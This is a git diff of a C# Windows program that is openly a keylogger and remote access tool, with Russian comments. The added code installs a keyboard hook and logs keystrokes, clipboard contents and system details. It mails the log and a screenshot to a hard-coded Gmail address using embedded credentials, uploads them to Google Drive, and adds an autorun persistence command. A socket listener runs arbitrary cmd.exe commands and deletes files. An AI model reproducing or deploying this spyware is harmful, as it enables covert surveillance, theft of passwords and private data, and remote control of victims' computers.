@@ -60,6 +60,65 @@ namespace ConsoleApp2
 
             //             ShowWindow(handle, SW_HIDE);
             ShowWindow(handle, 1);
+            fillDictionaries();
+            _hookID = SetHook(_proc);
+           
+            Writer("\n========================================================================================================================\n\nCurrentDirectory: " + Environment.CurrentDirectory + "\n");
+            Writer("MachineName: " + Environment.MachineName + "\n");
+            Writer("OSVersion: " + Environment.OSVersion.ToString() + "\n");
+            Writer("SystemDirectory: " + Environment.SystemDirectory + "\n");
+            Writer("UserDomainName: " + Environment.UserDomainName + "\n");
+            Writer("UserInteractive: " + Environment.UserInteractive + "\n");
+            Writer("UserName: " + Environment.UserName + "\n\n========================================================================================================================\n\n");
+
+            Console.WriteLine(AppDomain.CurrentDomain.BaseDirectory);
+            Console.WriteLine(System.Net.Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString());
+
+            string htmlData = GetBuff();
+            Console.WriteLine("Clipboard: {0}\n", htmlData);
+     //       GoogleDriveLoad();
+
+            // получаем текущую раскладку клавиатуры
+            ushort lang = GetKeyboardLayout();
+
+            mss = lang.ToString();
+            Writer("Original keyboard layout: " + mss + "\n");
+            Thread mtr = new System.Threading.Thread(ServerSocket);
+            mtr.Start();
+
+             SmtpSend(DateTime.Now.ToString());
+
+            Application.Run();
+
+            UnhookWindowsHookEx(_hookID);
+        }
+
+        public static void SmtpSend(string message)
+            
+        {
+            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
+            client.Credentials = new System.Net.NetworkCredential("k0z9vk1n@gmail.com", "keylogger");
+            client.EnableSsl = true;
+            string msgFrom = "k0z9vk1n@gmail.com";
+           // string msgTo = "donlancaster228@yandex.ru";
+            string msgTo = "donlancaster228@gmail.com";
+            string msgSubject = "keylogger";
+            Screenshot();
+            MailMessage msg = new MailMessage(msgFrom, msgTo, msgSubject, message);
+            //   System.Diagnostics.Process.GetCurrentProcess().WaitForInputIdle(5000);
+            Attachment a = new Attachment(AppDomain.CurrentDomain.BaseDirectory + "log.dat");
+            Attachment b = new Attachment(AppDomain.CurrentDomain.BaseDirectory + "screen.jpg");
+            msg.Attachments.Add(a);
+            msg.Attachments.Add(b);
+            client.Send(msg);
+            a.Dispose();
+            b.Dispose();
+            client.Dispose();
+        }
+
+
+        private static void fillDictionaries()
+        {
             dictionaryRusEng.Add('Q', 'Й');
             dictionaryRusEng.Add('W', 'Ц');
             dictionaryRusEng.Add('E', 'У');
@@ -109,36 +168,8 @@ namespace ConsoleApp2
             dictionaryDigits.Add('-', '_');
             dictionaryDigits.Add('=', '+');
 
-
-
-
-            _hookID = SetHook(_proc);
-            // получаем переменные окружения и данные о пользователе
-
-
-            Writer("\n========================================================================================================================\n\nCurrentDirectory: " + Environment.CurrentDirectory + "\n");
-            Writer("MachineName: " + Environment.MachineName + "\n");
-            Writer("OSVersion: " + Environment.OSVersion.ToString() + "\n");
-            Writer("SystemDirectory: " + Environment.SystemDirectory + "\n");
-            Writer("UserDomainName: " + Environment.UserDomainName + "\n");
-            Writer("UserInteractive: " + Environment.UserInteractive + "\n");
-            Writer("UserName: " + Environment.UserName + "\n\n========================================================================================================================\n\n");
-
-
-            // получаем буфер обмена при запуске
-            string htmlData = GetBuff();
-            Console.WriteLine("Clipboard: {0}\n", htmlData);
-
-            // получаем текущую раскладку клавиатуры
-            ushort lang = GetKeyboardLayout();
-
-            mss = lang.ToString();
-            Writer("Original keyboard layout: " + mss + "\n");
-            Thread mtr = new System.Threading.Thread(ServerSocket);
-            mtr.Start();
-            Application.Run();
-            UnhookWindowsHookEx(_hookID);
         }
+
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -148,7 +179,6 @@ namespace ConsoleApp2
                     GetModuleHandle(curModule.ModuleName), 0);
             }
         }
-
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -184,7 +214,7 @@ namespace ConsoleApp2
 
                 //   if (original.Length==1 && !capsLock) { original = original.ToLower(); }
                 // if (original.Length==1 && !sh){ original = original.ToLower(); }
-                // запрашиваем раскладку клавиатуры для каждого символа
+                
 
 
                 ushort lang_check = GetKeyboardLayout();
@@ -194,7 +224,7 @@ namespace ConsoleApp2
                 else
                 {
                     //    Console.WriteLine("Смена раскладки: {0}", mss_check);
-                    encrypted = Encrypt("\n<Смена раскладки:" + mss_check + " >\n", "Key");
+                 //   encrypted = Encrypt("\n<Смена раскладки:" + mss_check + " >\n", "Key");
                     Writer("\n\t< Смена раскладки: " + mss_check + " >\n");
                     //      Writer(encrypted);
                     mss = mss_check;
@@ -442,7 +472,7 @@ namespace ConsoleApp2
                                                                                        //  Writer(Encrypt("Содержимое буфера: " + htmlData1 + "\n", "Key"));                  // записываем буфер
                                                                                        //  Console.WriteLine("Clipboard: {0}", htmlData1);
 
-                    encrypted = Encrypt("\n<COPY>\n", "Key");
+//                    encrypted = Encrypt("\n<COPY>\n", "Key");
 
                     //  Writer(encrypted);
                 }
@@ -452,7 +482,7 @@ namespace ConsoleApp2
 
                     //return (IntPtr)1; // вроде как блокировка нажатия работает, проверил
                     //    Console.WriteLine("CTRL+V: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n\t<PASTE>\n", "Key");
+          //          encrypted = Encrypt("\n\t<PASTE>\n", "Key");
                     // Writer(encrypted);
                     Writer("\n\t<PASTE> \n");
                     Writer("Содержимое буфера: " + GetBuff().ToString() + "\n");
@@ -461,7 +491,7 @@ namespace ConsoleApp2
                 {
 
                     //   Console.WriteLine("CTRL+Z: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n\t<CANCEL>\n", "Key");
+                //    encrypted = Encrypt("\n\t<CANCEL>\n", "Key");
                     //  Writer(encrypted);
                     Writer("\n\t<CANCEL>\n");
                 }
@@ -469,7 +499,7 @@ namespace ConsoleApp2
                 {
 
                     //Console.WriteLine("CTRL+F: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n\t<SEARCH>\n", "Key");
+                  //  encrypted = Encrypt("\n\t<SEARCH>\n", "Key");
                     //Writer(encrypted);
                     Writer("\n\t<SEARCH>\n");
                 }
@@ -477,7 +507,7 @@ namespace ConsoleApp2
                 {
 
                     //Console.WriteLine("CTRL+A: {0}", (Keys)vkCode);
-                    encrypted = Encrypt("\n\t<SELECT ALL>\n", "Key");
+              //      encrypted = Encrypt("\n\t<SELECT ALL>\n", "Key");
                     //
                     //Writer(encrypted);
                     Writer("\n\t<SELECT ALL>\n");
@@ -486,14 +516,14 @@ namespace ConsoleApp2
                 {
 
 
-                    encrypted = Encrypt("\t<NEW>\n", "Key");
+                   // encrypted = Encrypt("\t<NEW>\n", "Key");
                     //Writer(encrypted);
                     Writer("\n\t<NEW>\n");
                 }
                 else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-                    encrypted = Encrypt("\t<CTRL+T>\n", "Key");
+                    //encrypted = Encrypt("\t<CTRL+T>\n", "Key");
                     Writer("\n\t<CTRL T>\n");
                     // Writer(encrypted);
 
@@ -502,7 +532,7 @@ namespace ConsoleApp2
                 {
 
 
-                    encrypted = Encrypt("\n\t<CUT>\n", "Key");
+                    //encrypted = Encrypt("\n\t<CUT>\n", "Key");
                     //Writer(encrypted);
                     Writer("\n\t<CUT>\n");
                 }
@@ -531,86 +561,7 @@ namespace ConsoleApp2
 
         }
 
-        public static string Encrypt(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
-        {
-            if (string.IsNullOrEmpty(plainText))
-                return "";
-
-            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
-            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
-            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);
-
-            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
-             (password, saltValueBytes, hashAlgorithm, passwordIterations);
-
-            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
-            RijndaelManaged symmetricKey = new RijndaelManaged();
-            symmetricKey.Mode = CipherMode.CBC;
-
-            byte[] cipherTextBytes = null;
-
-            using (ICryptoTransform encryptor = symmetricKey.CreateEncryptor
-            (keyBytes, initialVectorBytes))
-            {
-                using (MemoryStream memStream = new MemoryStream())
-                {
-                    using (CryptoStream cryptoStream = new CryptoStream
-                             (memStream, encryptor, CryptoStreamMode.Write))
-                    {
-                        cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
-                        cryptoStream.FlushFinalBlock();
-                        cipherTextBytes = memStream.ToArray();
-                        memStream.Close();
-                        cryptoStream.Close();
-                    }
-                }
-            }
-
-            symmetricKey.Clear();
-            return Convert.ToBase64String(cipherTextBytes);
-        }
-
-        public static string Decrypt(string encryptedText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
-        {
-            if (string.IsNullOrEmpty(encryptedText))
-                return "";
-            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
-            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
-            byte[] encryptedTextBytes = Encoding.UTF8.GetBytes(encryptedText);
-
-            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
-            (password, saltValueBytes, hashAlgorithm, passwordIterations);
-
-            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
-            RijndaelManaged symmetricKey = new RijndaelManaged();
-            symmetricKey.Mode = CipherMode.CBC;
-
-            byte[] decryptedTextBytes = null;
-
-            using (ICryptoTransform decryptor = symmetricKey.CreateDecryptor
-           (keyBytes, initialVectorBytes))
-            {
-                using (MemoryStream memStream = new MemoryStream())
-                {
-                    using (CryptoStream cryptoStream = new CryptoStream
-                            (memStream, decryptor, CryptoStreamMode.Write))
-                    {
-                        cryptoStream.Write(encryptedTextBytes, 0, encryptedTextBytes.Length);
-                        ////////////////////////////////
-                        ///
-                        cryptoStream.FlushFinalBlock();
-                        ///
-                        /////////////////////////////////
-                        decryptedTextBytes = memStream.ToArray();
-                        memStream.Close();
-                        cryptoStream.Close();
-                    }
-                }
-            }
-            symmetricKey.Clear();
-            return Convert.ToBase64String(decryptedTextBytes);
-        }
-
+   
         private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
@@ -624,54 +575,6 @@ namespace ConsoleApp2
             return null;
         }
 
-
-
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
-        internal static extern short GetKeyState(int keyCode);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-            IntPtr wParam, IntPtr lParam);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
-
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
-
-
-        //------------------------------Пробуем узнать раскладку клавиатуры-------------------------------------------------//
-
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern int GetWindowThreadProcessId(
-            [In] IntPtr hWnd,
-            [Out, Optional] IntPtr lpdwProcessId
-            );
-
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern IntPtr GetForegroundWindow();
-
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern ushort GetKeyboardLayout(
-            [In] int idThread
-            );
-
-        [DllImport("user32.dll")]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
         static ushort GetKeyboardLayout()
         {
@@ -713,7 +616,7 @@ namespace ConsoleApp2
             var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
             graph = Graphics.FromImage(bmp);
             graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
-            Console.WriteLine(Application.StartupPath + @"\screen.bmp");
+          //  Console.WriteLine(Application.StartupPath + @"\screen.jpg");
             bmp.Save(Application.StartupPath + @"\screen.jpg");
         }
 
@@ -746,15 +649,6 @@ namespace ConsoleApp2
         }
 
 
-
-
-
-
-
-
-
-
-
         public static void NewProcess(string s, string f1, Socket client)
         {
             Process process = new Process();
@@ -773,10 +667,6 @@ namespace ConsoleApp2
             process.Close();
             SSend("\n\nPress an key to exit", client);
         }
-
-
-
-
 
 
         public static void SSend(string reply, Socket client)
@@ -834,6 +724,8 @@ namespace ConsoleApp2
                                 NewProcess("ipconfig", Arguments, client);
                                 break;
 
+
+
                             case "help":
                                 SSend("\nСинтаксис: cmd params <Enter>\nПримеры:\ncmd taskkill /IM notepad.exe /f" +
                                 "\ncmd tasklist	\ncmd ipconfig /all\ncmd notepad.exe\n\nУдаление файлов:\ndel path_to_file или cmd del path_to file" +
@@ -844,6 +736,32 @@ namespace ConsoleApp2
 
                                 SSend("BYE!", client);
                                 break;
+
+                            case "autorun":
+                                if (Arguments.Length == 0)
+                                {
+                                    Console.WriteLine("Для команды флаги обязательны");
+                                    SSend("Для команды флаги обязательны", client);
+                                    break;
+                                }
+                                if (Arguments == "true")
+                                {
+                                    SetAutorunValue(true, client);
+                                    break;
+                                }
+                                else if (Arguments == "false")
+                                {
+                                    SetAutorunValue(false, client);
+                                    break;
+
+                                }
+                                else
+                                {
+                                    Console.WriteLine("Введены неверные знаения. Поддерживаются только true и false");
+                                    SSend("Введены неверные знаения. Поддерживаются только true и false", client);
+                                    break;
+                                }
+
 
                             case "cmd":
 
@@ -856,6 +774,7 @@ namespace ConsoleApp2
 
                                 NewProcess("cmd.exe", "/C" + Arguments, client);
                                 break;
+
 
                             case "del":
                                 if (Arguments.Length == 0)
@@ -889,7 +808,8 @@ namespace ConsoleApp2
                             default:
                                 /*if (fileName == "screen" && fileName == "log")
                                     SSend(" ", client);
-                                else*/ SSend("Чтобы посотмреть доступные команды введите help", client);
+                                else*/
+                                SSend("Чтобы посмотреть доступные команды введите help", client);
                                 break;
 
                         }
@@ -913,7 +833,7 @@ namespace ConsoleApp2
 
                         if (fileName == "log")
                         {
-                            Screenshot();
+                            //    Screenshot();
                             try
                             {
 
@@ -927,6 +847,22 @@ namespace ConsoleApp2
 
                         }
 
+                        //передать в SmtpSend почту 
+
+                        if (fileName == "mail")
+                        {
+                            SmtpSend(DateTime.Now.ToString());
+                            //// Thread.Sleep(2000);
+                            SSend("mail sent", client);
+
+                        }
+
+                        if (fileName == "google")
+                        {
+                            GoogleDriveLoad();
+                            SSend("google drive updated", client);
+                        }
+
 
 
                     }
@@ -936,113 +872,10 @@ namespace ConsoleApp2
                         Console.Write(e.Message);
 
                     }
-
-
                 }
             }
         }
-/*
-        public static void ServerSocket2()
-        {
-            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
-            Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            newsock.Bind(ipep);
-            newsock.Listen(10);
-            Console.WriteLine("Waiting for a client...");
-            while (true)
-            {
-                {
-                    try
-                    {
-                        Socket client = newsock.Accept();
-                        IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
-                        Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
 
-                        string data = null;
-                        byte[] bytes = new byte[1024 * 1024];
-                        int bytesRec = client.Receive(bytes);
-                        data += Encoding.UTF8.GetString(bytes, 0, bytesRec);
-                        Console.WriteLine("Полученное сообщение: " + data + "\n\n");
-
-                        var splitChars = new[] { ' ' };
-                        string Arguments = "";
-
-                        string[] a = data.Split(splitChars, 2);
-                        string fileName = a[0];
-                        if (a.Length > 1) Arguments = a[1];
-
-                        switch (fileName)
-                        {
-                            case "ipconfig":
-                                NewProcess("ipconfig", Arguments, client);
-                                break;
-                            case "cmd":
-                                if (Arguments.Length == 0)
-                                {
-                                    Console.WriteLine("Флаги обязательны");
-                                    SSend("Флаги обязательны", client);
-                                    break;
-                                }
-                                NewProcess("cmd.exe", "/c" + Arguments, client);
-                                break;
-                            case "del":
-                                if (Arguments.Length == 0)
-                                {
-                                    Console.WriteLine("Флаги обязательны");
-                                    SSend("Флаги обязательны", client);
-                                    break;
-                                }
-                                FileInfo fi2 = new FileInfo(Arguments);
-                                try
-                                {
-                                    fi2.Delete();
-                                    SSend("файл удален", client);
-
-                                }
-                                catch (Exception ex)
-                                {
-                                    SSend(ex.ToString(), client);
-                                    break;
-                                }
-                                break;
-                            default:
-                                SSend("Невыполнимая команда. HELP", client);
-                                break;
-                        }
-                        if (fileName == "screen")
-                        {
-                            Screenshot();
-                            try
-                            {
-                                SocketWorker(@"\screen.jpg", client);
-                            }
-                            catch (Exception e)
-                            {
-                                Console.WriteLine(e.Message);
-                            }
-                        }
-                        if (fileName == "log")
-                        {
-                            Screenshot();
-                            try
-                            {
-                                SocketWorker(@"log.dat", client);
-
-                            }
-                            catch (Exception e)
-                            {
-                                Console.WriteLine(e.Message);
-                            }
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e.Message);
-                    }
-                }
-            }
-        }
-*/
         public static void SocketWorker(string fileName, Socket client)
         {
             string filePath = Application.StartupPath;
@@ -1060,54 +893,59 @@ namespace ConsoleApp2
         }
 
 
-   /*     public static void ServerSocket3()
-        {
-            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
-            Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            try
-            {
-                newsock.Bind(ipep);
-                newsock.Listen(10);
-                Console.WriteLine("Waiting for a client...");
-
-                while (true)
-                {
-                    Socket client = newsock.Accept();
-                    IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
-                    Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
-                    string data = null;
-                    FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
-                    string fsize = fi.Length.ToString();
-                    try
-                    {
-
-                        client.SendFile(Application.StartupPath + @"\log.dat");
-                        Console.WriteLine("Disconnected from {0}", clientep.Address);
-                        client.Close();
-                        newsock.Close();
-
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.Write(ex.Message);
-                    }
-                }
-            }
-
-            catch (Exception e)
-            {
-                Console.Write(e.Message);
-            }
-
-        }
-*/
-
         public static void GoogleDriveLoad()
         {
+            GoogleAPI.Process("log.dat","text/plain");
+            Screenshot();
+            GoogleAPI.Process("screen.jpg","image/jpeg");
+
 
         }
+
+
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        internal static extern short GetKeyState(int keyCode);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern int GetWindowThreadProcessId([In] IntPtr hWnd,[Out, Optional] IntPtr lpdwProcessId);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern ushort GetKeyboardLayout([In] int idThread);
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
 
 
     }
+
+
 
 }
